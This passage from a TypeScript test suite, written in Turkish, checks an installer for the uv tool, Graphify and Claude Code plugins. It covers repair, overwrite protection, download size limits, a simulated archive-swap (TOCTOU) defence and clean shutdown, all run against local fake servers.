  assert.ok(sunucu.istekler.length > istekOnce, 'silinen uv yeniden indi');
  assert.deepEqual(uvKurulumlari().slice(-2), [['tool', 'install', '--force', 'graphifyy==0.9.95'], ['tool', 'install', '--force', 'graphifyy==0.9.95']], 'onarım (düşen ve başaran) tam olarak bu argümanlarla');
  assert.deepEqual((await s.k.durum()).graphify, { kanca: true, calistirilabilir: true }, 'onarıldı');
  assert.match(fs.readFileSync(s.k.gunlukYolu, 'utf8'), /onarım/);
  // Sorun yokken beceri varsa yine atlanır (yeniden kurmaz).
  const n = uvKurulumlari().length;
  await s.k.ogeKur('graphify');
  await s.bitti();
  assert.equal(hal(s.k, 'graphify')?.hal, 'kurulu');
  assert.equal(uvKurulumlari().length, n);
});

test('G7: sahte uv gerçeği gibi davranır — başka bir graphify.exe varken --force olmadan "Executable already exists"; ilk kurulum onu ezmez', async () => {
  const s = senaryo();
  const bin = path.join(s.ev, '.local', 'bin');
  fs.mkdirSync(bin, { recursive: true });
  fs.writeFileSync(path.join(bin, 'graphify.exe'), 'kullanıcının kendi graphify’ı');
  s.k.paketBaslat(['graphify']);
  await s.bitti();
  assert.equal(hal(s.k, 'graphify')?.hal, 'hata');
  assert.match(hal(s.k, 'graphify')?.ileti ?? '', /already exists/);
  assert.equal(fs.readFileSync(path.join(bin, 'graphify.exe'), 'utf8'), 'kullanıcının kendi graphify’ı', 'ezilmedi');
});

test('G7 (4a): Graphify denetimi PATH’in tamamını taramaz — yalnız uv’nin komut klasörleri ve kancanın mutlak yolu', () => {
  const yonetim = fs.readFileSync(path.join(kok, 'src', 'main', 'claudecode', 'eklenti-yonetim.ts'), 'utf8');
  const govde = /export function graphifyKomutDizinleri\(\)[\s\S]*?\n\}/.exec(yonetim)?.[0] ?? '';
  assert.ok(govde.length > 0, 'graphifyKomutDizinleri bulunamadı');
  assert.doesNotMatch(govde, /\bPATH\b|\.Path\b|path\.delimiter/, 'PATH taranmamalı');
  assert.match(govde, /\.local/);
});

test('madde 6: İş modunda katalog listesi resmi kataloğu EKLEMEZ (marketplace add yok; yalnız okunur)', async () => {
  const s = senaryo({ SAHTE_CC_KATALOG: 'yok' }, { etkin: () => false });
  const l = await s.k.liste('katalog', true);
  assert.ok(Array.isArray(l.liste));
  assert.ok(!s.claudeKayit().some((a) => a[1] === 'marketplace' && a[2] === 'add'), `İş modunda katalog eklendi: ${JSON.stringify(s.claudeKayit())}`);
  // Geliştirici'de eklenir.
  const g = senaryo({ SAHTE_CC_KATALOG: 'yok' });
  await g.k.liste('katalog', true);
  assert.ok(g.claudeKayit().some((a) => a.join(' ') === 'plugin marketplace add anthropics/claude-plugins-official --scope user'));
});

test('madde 7: uv indirmesi boyut sınırını (UV_ARSIVI.boyut) aşınca KESİLİR — özet tutsa bile açılmaz; bildirilmeyen boyutta akış yarıda bırakılır', async () => {
  const buyuk = zipOlustur([{ ad: 'uv.exe', veri: crypto.randomBytes(4 * 1024 * 1024) }], { yontem: 0 });
  const sb = await sahteUvSunucusu({ zip: buyuk });
  try {
    // content-length bildirilir: hiç başlamadan durur.
    const s = senaryo({}, { uvKaynagi: { url: sb.url, sha256: sha256(buyuk), boyut: 1000 } });
    await assert.rejects(() => s.k.uvHazirla(), /uv indirmesi durduruldu: .*beklenenden büyük.*hiçbir şey açılmadı/);
    assert.ok(!fs.existsSync(path.join(s.veri, 'araclar', 'uv', '0.13.5')), 'büyük arşiv açıldı');
    assert.deepEqual(fs.readdirSync(path.join(s.veri, 'araclar', 'indirme')), []);
    // content-length yok: sınır akışta uygulanır, sunucu gövdenin tamamını gönderemeden bağlantı kesilir.
    sb.govdeYap(buyuk, { uzunlukYok: true });
    const s2 = senaryo({}, { uvKaynagi: { url: sb.url, sha256: sha256(buyuk), boyut: 1000 } });
    await assert.rejects(() => s2.k.uvHazirla(), /beklenenden büyük/);
    await bekleKosul(() => sb.istekler.at(-1)!.yarida, 5000, 'sunucu bağlantının kesildiğini gördü');
    assert.ok(sb.istekler.at(-1)!.gonderilen < buyuk.length, `akış kesilmedi (${sb.istekler.at(-1)!.gonderilen}/${buyuk.length})`);
    assert.ok(!fs.existsSync(path.join(s2.veri, 'araclar', 'uv', '0.13.5')));
    assert.deepEqual(fs.readdirSync(path.join(s2.veri, 'araclar', 'indirme')), [], 'yarım dosya kaldı');
    // Üretim sınırı: sabit arşivin boyutu.
    assert.equal(UV_ARSIVI.boyut, 15_264_056);
  } finally { await sb.kapat(); }
});

test('madde 7: özeti alınan tampon AYNEN açılır — doğrulamadan sonra diskteki arşiv değişse de açılan doğrulanmış içeriktir (TOCTOU yok)', async () => {
  const s = senaryo();
  const kotu = zipOlustur([{ ad: 'uv.exe', veri: 'KÖTÜ uv (doğrulamadan sonra konan)' }]);
  const arsiv = (y: unknown) => /uv-0\.13\.5\.zip$/.test(String(y));
  const asilOku = fs.readFileSync, asilAkis = fs.createReadStream, asilYaz = fs.writeFileSync;
  let okuma = 0;
  // Saldırgan: arşiv her okunduktan hemen sonra diskte kötüsüyle değiştirilir.
  (fs as { readFileSync: unknown }).readFileSync = function (y: fs.PathOrFileDescriptor, ...a: unknown[]) {
    const r = (asilOku as (...x: unknown[]) => unknown).call(fs, y, ...a);
    if (arsiv(y)) { okuma++; asilYaz.call(fs, y, kotu); }
    return r;
  };
  (fs as { createReadStream: unknown }).createReadStream = function (y: fs.PathLike, ...a: unknown[]) {
    const akis = (asilAkis as (...x: unknown[]) => fs.ReadStream).call(fs, y, ...a);
    if (arsiv(y)) akis.on('end', () => { okuma++; asilYaz.call(fs, y, kotu); });
    return akis;
  };
  try {
    const exe = await s.k.uvHazirla();
    assert.equal(asilOku.call(fs, exe, 'utf8'), 'SAHTE uv 0.13.5 — çalıştırılmaz\n'.repeat(200), 'doğrulanmamış (değiştirilmiş) arşiv açıldı');
    assert.equal(okuma, 1, 'arşiv diskten birden çok kez okundu');
  } finally {
    (fs as { readFileSync: unknown }).readFileSync = asilOku;
    (fs as { createReadStream: unknown }).createReadStream = asilAkis;
  }
});

test('madde 8: Graphify yalnız Windows\'ta — başka işletim sisteminde uv indirilmez, açık "yalnız Windows" iletisi; katalog eklentileri sürer', async () => {
  const s = senaryo({}, { platform: 'darwin' });
  const once = sunucu.istekler.length;
  s.k.paketBaslat(['graphify', 'superpowers']);
  await s.bitti();
  assert.equal(hal(s.k, 'graphify')?.hal, 'hata');
  assert.match(hal(s.k, 'graphify')?.ileti ?? '', /yalnız Windows’ta kurulur; macOS\/Linux’ta elle: uv tool install graphifyy==0\.9\.95/);
  assert.equal(sunucu.istekler.length, once, 'Windows dışında uv indirildi');
  assert.deepEqual(s.uvKayit(), []);
  assert.deepEqual(s.graphifyKayit(), []);
  assert.equal(hal(s.k, 'superpowers')?.hal, 'kuruldu');
});

test('madde 9: kapat() (uygulama kapanışı) süren kurulum komutunu süreç ağacıyla durdurur; yeni komut başlamaz, öğeler sonraki açılışta sürer', async () => {
  const s = senaryo({ SAHTE_CC_YAVAS_MS: '8000' });
  s.k.paketBaslat(['superpowers', 'code-review']);
  await bekleKosul(() => s.claudeKayit().some((a) => a[1] === 'install') && calisanSurecler().length > 0, 20_000, 'kurulum başladı');
  await uyu(150);
  const pidler = calisanSurecler();
  assert.ok(pidler.length >= 1);
  s.k.kapat();
  assert.deepEqual(calisanSurecler(), []);
  const yasiyor = (pid: number) => { try { process.kill(pid, 0); return true; } catch { return false; } };
  await bekleKosul(() => pidler.every((p) => !yasiyor(p)), 5000, 'süreçler durdu');
  await uyu(400);
  assert.equal(s.claudeKayit().filter((a) => a[1] === 'install').length, 1, 'kapandıktan sonra yeni kurulum başladı');
  const yeni = new EklentiKurucu({ veriDizini: path.join(s.veri, 'claudecode'), araclarDizini: path.join(s.veri, 'araclar'), claudeDizini: () => s.claude });
  assert.deepEqual(yeni.paketDurumu().ogeler.map((o) => [o.id, o.hal]), [['superpowers', 'sirada'], ['code-review', 'sirada']], 'durdurulan kurulum "hata" diye yazıldı');
  assert.ok(fs.readFileSync(s.k.gunlukYolu, 'utf8').includes('uygulama kapanıyor: süren'), 'günlükte yok');
});

test('sahte sunucunun arşivi gerçek bir zip (uv.exe metni içerir; çalıştırılmaz)', () => {
  const z = sahteUvZip();
  assert.equal(z.readUInt32LE(0), 0x04034b50);
  assert.equal(sha256(z), sunucu.sha256);
});
